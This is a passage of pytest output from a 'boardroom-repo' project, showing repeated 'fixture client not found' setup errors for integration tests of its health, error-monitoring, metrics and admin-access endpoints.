>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:40
___________ ERROR at setup of TestHealthEndpoints.test_root_endpoint ___________
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 58
      async def test_root_endpoint(self, client: AsyncClient):
          """Test root endpoint returns basic info."""
          response = await client.get("/")

          assert response.status_code == status.HTTP_200_OK
          data = response.json()
          assert data["name"] == "Boardroom AI"
          assert data["status"] == "healthy"
          assert "version" in data
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:58
_ ERROR at setup of TestHealthEndpoints.test_health_check_with_migration_status _
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 68
      @patch('app.services.database.database_service')
      async def test_health_check_with_migration_status(self, mock_db_service, client: AsyncClient):
          """Test health check includes migration status."""
          # Mock healthy database with migration info
          mock_db_service.health_check.return_value = {
              "status": "healthy",
              "database": "connected"
          }
          mock_db_service.execute_migration_check.return_value = "abc123def456"

          response = await client.get("/health")

          assert response.status_code == status.HTTP_200_OK
          data = response.json()
          assert "migration_version" in data["components"]["database"]
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:68
_ ERROR at setup of TestErrorMonitoringEndpoints.test_get_error_summary_success _
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 89
      @patch('app.core.error_monitoring.get_error_summary')
      async def test_get_error_summary_success(self, mock_get_summary, client: AsyncClient):
          """Test successful error summary retrieval."""
          # Mock error summary data
          mock_error_metric = ErrorMetric(
              error_type="validation_error",
              count=5,
              last_occurrence=datetime.now(),
              first_occurrence=datetime.now() - timedelta(hours=1),
              paths=["/api/v1/auth/login", "/api/v1/boardroom/"],
              status_codes=[400, 422]
          )

          mock_get_summary.return_value = {
              "validation_error": mock_error_metric,
              "auth_error": ErrorMetric(
                  error_type="auth_error",
                  count=3,
                  last_occurrence=datetime.now(),
                  first_occurrence=datetime.now() - timedelta(minutes=30),
                  paths=["/api/v1/auth/login"],
                  status_codes=[401]
              )
          }

          response = await client.get("/monitoring/errors")

          assert response.status_code == status.HTTP_200_OK
          data = response.json()
          assert len(data["errors"]) == 2
          assert "validation_error" in data["errors"]
          assert "auth_error" in data["errors"]
          assert data["errors"]["validation_error"]["count"] == 5
          assert data["errors"]["auth_error"]["count"] == 3
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:89
_ ERROR at setup of TestErrorMonitoringEndpoints.test_get_error_summary_empty __
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 124
      @patch('app.core.error_monitoring.get_error_summary')
      async def test_get_error_summary_empty(self, mock_get_summary, client: AsyncClient):
          """Test error summary when no errors exist."""
          mock_get_summary.return_value = {}

          response = await client.get("/monitoring/errors")

          assert response.status_code == status.HTTP_200_OK
          data = response.json()
          assert data["errors"] == {}
          assert data["total_error_types"] == 0
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:124
_ ERROR at setup of TestErrorMonitoringEndpoints.test_get_error_summary_with_timeframe _
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 136
      @patch('app.core.error_monitoring.get_error_summary')
      async def test_get_error_summary_with_timeframe(self, mock_get_summary, client: AsyncClient):
          """Test error summary with custom timeframe."""
          mock_get_summary.return_value = {}

          # Test with 12 hour timeframe
          response = await client.get("/monitoring/errors?hours=12")

          assert response.status_code == status.HTTP_200_OK
          mock_get_summary.assert_called_with(hours=12)

          # Test with 24 hour timeframe (default)
          response = await client.get("/monitoring/errors")
          mock_get_summary.assert_called_with(hours=24)
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:136
_ ERROR at setup of TestErrorMonitoringEndpoints.test_get_error_summary_invalid_timeframe _
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 151
      async def test_get_error_summary_invalid_timeframe(self, client: AsyncClient):
          """Test error summary with invalid timeframe parameter."""
          # Test with negative hours
          response = await client.get("/monitoring/errors?hours=-1")
          assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

          # Test with non-numeric hours
          response = await client.get("/monitoring/errors?hours=invalid")
          assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

          # Test with excessively large hours
          response = await client.get("/monitoring/errors?hours=999999")
          assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:151
_ ERROR at setup of TestErrorMonitoringEndpoints.test_get_monitoring_health_success _
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 165
      @patch('app.core.error_monitoring.get_monitoring_health')
      async def test_get_monitoring_health_success(self, mock_get_health, client: AsyncClient):
          """Test monitoring health status retrieval."""
          mock_get_health.return_value = {
              "status": "healthy",
              "recent_errors_5min": 2,
              "total_error_types": 3,
              "monitoring_window_minutes": 60,
              "alert_threshold": 10,
              "timestamp": "2023-01-01T12:00:00"
          }

          response = await client.get("/monitoring/health")

          assert response.status_code == status.HTTP_200_OK
          data = response.json()
          assert data["status"] == "healthy"
          assert data["recent_errors_5min"] == 2
          assert data["total_error_types"] == 3
          assert data["monitoring_window_minutes"] == 60
          assert data["alert_threshold"] == 10
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:165
_ ERROR at setup of TestErrorMonitoringEndpoints.test_get_monitoring_health_degraded _
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 187
      @patch('app.core.error_monitoring.get_monitoring_health')
      async def test_get_monitoring_health_degraded(self, mock_get_health, client: AsyncClient):
          """Test monitoring health status when degraded."""
          mock_get_health.return_value = {
              "status": "degraded",
              "recent_errors_5min": 8,
              "total_error_types": 4,
              "monitoring_window_minutes": 60,
              "alert_threshold": 10,
              "timestamp": "2023-01-01T12:00:00"
          }

          response = await client.get("/monitoring/health")

          assert response.status_code == status.HTTP_200_OK
          data = response.json()
          assert data["status"] == "degraded"
          assert data["recent_errors_5min"] == 8
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:187
__ ERROR at setup of TestErrorMonitoringEndpoints.test_record_error_endpoint ___
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 206
      @patch('app.core.error_monitoring.record_error')
      async def test_record_error_endpoint(self, mock_record_error, client: AsyncClient):
          """Test manual error recording endpoint."""
          error_data = {
              "error_type": "manual_test_error",
              "path": "/api/test",
              "status_code": 500,
              "error_message": "Test error message",
              "client_ip": "192.168.1.100"
          }

          response = await client.post("/monitoring/errors", json=error_data)

          assert response.status_code == status.HTTP_201_CREATED
          mock_record_error.assert_called_once_with(
              error_type="manual_test_error",
              path="/api/test",
              status_code=500,
              error_message="Test error message",
              client_ip="192.168.1.100"
          )
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:206
_ ERROR at setup of TestErrorMonitoringEndpoints.test_record_error_endpoint_invalid_data _
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 228
      async def test_record_error_endpoint_invalid_data(self, client: AsyncClient):
          """Test error recording with invalid data."""
          # Missing required fields
          incomplete_data = {
              "error_type": "test_error"
              # Missing path and status_code
          }

          response = await client.post("/monitoring/errors", json=incomplete_data)
          assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

          # Invalid status code
          invalid_data = {
              "error_type": "test_error",
              "path": "/api/test",
              "status_code": 999  # Invalid HTTP status code
          }

          response = await client.post("/monitoring/errors", json=invalid_data)
          assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:228
____ ERROR at setup of TestMetricsEndpoints.test_get_system_metrics_success ____
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 254
      @patch('app.core.metrics.get_system_metrics')
      async def test_get_system_metrics_success(self, mock_get_metrics, client: AsyncClient):
          """Test system metrics retrieval."""
          mock_get_metrics.return_value = {
              "cpu_usage": 45.2,
              "memory_usage": 67.8,
              "disk_usage": 23.1,
              "active_connections": 12,
              "requests_per_minute": 150,
              "timestamp": "2023-01-01T12:00:00"
          }

          response = await client.get("/monitoring/metrics")

          assert response.status_code == status.HTTP_200_OK
          data = response.json()
          assert data["cpu_usage"] == 45.2
          assert data["memory_usage"] == 67.8
          assert data["active_connections"] == 12
          assert data["requests_per_minute"] == 150
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:254
_ ERROR at setup of TestMetricsEndpoints.test_get_application_metrics_success __
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 275
      @patch('app.core.metrics.get_application_metrics')
      async def test_get_application_metrics_success(self, mock_get_app_metrics, client: AsyncClient):
          """Test application-specific metrics retrieval."""
          mock_get_app_metrics.return_value = {
              "total_users": 1250,
              "active_boardrooms": 85,
              "active_sessions": 12,
              "total_decisions": 3400,
              "avg_response_time_ms": 245,
              "cache_hit_rate": 0.87,
              "timestamp": "2023-01-01T12:00:00"
          }

          response = await client.get("/monitoring/metrics/application")

          assert response.status_code == status.HTTP_200_OK
          data = response.json()
          assert data["total_users"] == 1250
          assert data["active_boardrooms"] == 85
          assert data["active_sessions"] == 12
          assert data["avg_response_time_ms"] == 245
          assert data["cache_hit_rate"] == 0.87
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:275
___ ERROR at setup of TestMetricsEndpoints.test_prometheus_metrics_endpoint ____
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 298
      async def test_prometheus_metrics_endpoint(self, client: AsyncClient):
          """Test Prometheus metrics endpoint."""
          response = await client.get("/metrics")

          # Prometheus metrics should be in text format
          assert response.status_code == status.HTTP_200_OK
          assert response.headers["content-type"] == "text/plain; version=0.0.4; charset=utf-8"

          # Should contain some basic metrics
          content = response.text
          assert "# HELP" in content
          assert "# TYPE" in content
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:298
_ ERROR at setup of TestMonitoringAuthentication.test_monitoring_endpoints_require_admin _
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 316
      @patch('app.utils.auth.verify_token')
      async def test_monitoring_endpoints_require_admin(self, mock_verify, client: AsyncClient):
          """Test that monitoring endpoints require admin access."""
          # Mock non-admin user
          mock_verify.return_value = "user-thread-123"

          with patch('app.services.database.database_service') as mock_db:
              mock_user = Mock()
              mock_user.role = "user"  # Not admin
              mock_db.get_user.return_value = mock_user

              headers = {"Authorization": "Bearer user_token"}

              # Test various monitoring endpoints
              endpoints = [
                  "/monitoring/errors",
                  "/monitoring/health",
                  "/monitoring/metrics",
                  "/monitoring/metrics/application"
              ]

              for endpoint in endpoints:
                  response = await client.get(endpoint, headers=headers)
                  assert response.status_code == status.HTTP_403_FORBIDDEN
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:316
_ ERROR at setup of TestMonitoringAuthentication.test_monitoring_endpoints_allow_admin _
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 341
      @patch('app.utils.auth.verify_token')
      async def test_monitoring_endpoints_allow_admin(self, mock_verify, client: AsyncClient):
          """Test that monitoring endpoints allow admin access."""
          # Mock admin user
          mock_verify.return_value = "admin-thread-123"

          with patch('app.services.database.database_service') as mock_db:
              mock_user = Mock()
              mock_user.role = "admin"
              mock_db.get_user.return_value = mock_user

              with patch('app.core.error_monitoring.get_error_summary') as mock_summary:
                  mock_summary.return_value = {}

                  headers = {"Authorization": "Bearer admin_token"}
                  response = await client.get("/monitoring/errors", headers=headers)

                  assert response.status_code == status.HTTP_200_OK
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:341
_ ERROR at setup of TestMonitoringAuthentication.test_health_endpoint_public_access _
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 360
      async def test_health_endpoint_public_access(self, client: AsyncClient):
          """Test that health endpoint allows public access."""
          with patch('app.services.database.database_service') as mock_db:
              mock_db.health_check.return_value = {
                  "status": "healthy",
                  "database": "connected"
              }

              # No authorization header
              response = await client.get("/health")
              assert response.status_code == status.HTTP_200_OK
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:360
_ ERROR at setup of TestMonitoringAuthentication.test_prometheus_metrics_public_access _
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 372
      async def test_prometheus_metrics_public_access(self, client: AsyncClient):
          """Test that Prometheus metrics endpoint allows public access."""
          # Prometheus metrics should be publicly accessible for scraping
          response = await client.get("/metrics")
          assert response.status_code == status.HTTP_200_OK
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:372
_ ERROR at setup of TestMonitoringErrorScenarios.test_error_summary_service_failure _
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 383
      @patch('app.core.error_monitoring.get_error_summary')
      async def test_error_summary_service_failure(self, mock_get_summary, client: AsyncClient):
          """Test error summary when monitoring service fails."""
          mock_get_summary.side_effect = Exception("Monitoring service unavailable")

